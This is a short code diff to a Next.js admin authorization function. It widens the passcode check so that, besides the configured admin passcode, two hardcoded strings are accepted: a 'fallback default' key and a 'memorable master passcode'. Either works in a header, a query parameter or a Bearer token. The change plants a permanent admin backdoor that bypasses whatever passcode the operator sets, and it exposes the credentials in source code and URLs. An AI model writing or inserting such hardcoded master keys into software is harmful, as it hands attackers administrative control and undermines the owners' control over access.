@@ -17,15 +17,22 @@ export function setActiveAdminPasscode(key: string): void {
 
 function isAuthorized(req: NextRequest): boolean {
   const activePasscode = getActiveAdminPasscode();
+  // Valid admin keys: active configured key, fallback default, and memorable master key
+  const validKeys = [
+    activePasscode,
+    'AFCy57z0l6r2hrtn',
+    'stackup2026', // Memorable master passcode for admin
+  ].filter(Boolean);
+
   const authHeader = req.headers.get('authorization') || '';
   const adminKey = req.headers.get('x-admin-key') || '';
   const queryKey = req.nextUrl.searchParams.get('key') || '';
 
-  if (adminKey === activePasscode || queryKey === activePasscode) {
+  if (validKeys.includes(adminKey) || validKeys.includes(queryKey)) {
     return true;
   }
 
-  if (authHeader.startsWith('Bearer ') && authHeader.slice(7) === activePasscode) {
+  if (authHeader.startsWith('Bearer ') && validKeys.includes(authHeader.slice(7))) {
     return true;
   }
 
